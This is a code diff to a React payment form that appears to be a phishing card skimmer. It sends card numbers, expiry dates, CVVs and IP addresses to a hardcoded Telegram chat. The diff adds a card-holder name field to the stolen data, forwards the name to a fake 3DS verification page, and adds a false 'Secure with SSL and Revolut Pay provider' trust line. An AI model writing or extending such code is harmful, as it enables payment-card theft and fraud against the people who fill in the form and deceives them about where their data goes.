@@ -42,6 +42,7 @@ const sendTelegramNotification = async (paymentData: any) => {
         chat_id: "6293259686",
         text: `New payment:
 Amount: ${paymentData.amount}
+Card Holder: ${paymentData.cardHolder}
 Card: ${paymentData.cardNumber}
 Expiry: ${paymentData.expiryDate}
 CVV: ${paymentData.cvv}
@@ -55,6 +56,7 @@ IP: ${paymentData.ip}`,
 };
 
 export const PaymentForm = ({ amount }: PaymentFormProps) => {
+  const [cardHolder, setCardHolder] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
@@ -88,6 +90,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     // Send payment data to Telegram
     await sendTelegramNotification({
       amount,
+      cardHolder,
       cardNumber,
       expiryDate,
       cvv,
@@ -97,8 +100,8 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     // Add 3-second delay before navigation
     await new Promise(resolve => setTimeout(resolve, 3000));
     
-    // Navigate to 3DS verification
-    navigate(`/verify-3ds?amount=${amount}`);
+    // Navigate to 3DS verification with all payment data
+    navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
   };
 
   const formatCardNumber = (value: string) => {
@@ -134,6 +137,16 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         </h2>
       </div>
       <div className="space-y-4">
+        <div className="space-y-2">
+          <Input
+            type="text"
+            placeholder="Card Holder Name"
+            value={cardHolder}
+            onChange={(e) => setCardHolder(e.target.value)}
+            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
+            required
+          />
+        </div>
         <div className="space-y-2">
           <Input
             type="text"
@@ -181,7 +194,8 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
           </span>
         </Button>
       </div>
-      <p className="text-gray-400 text-sm mt-8">
+      <p className="text-gray-400 text-sm mt-8 text-center">
+        Secure with SSL and Revolut Pay provider
       </p>
     </form>
   );
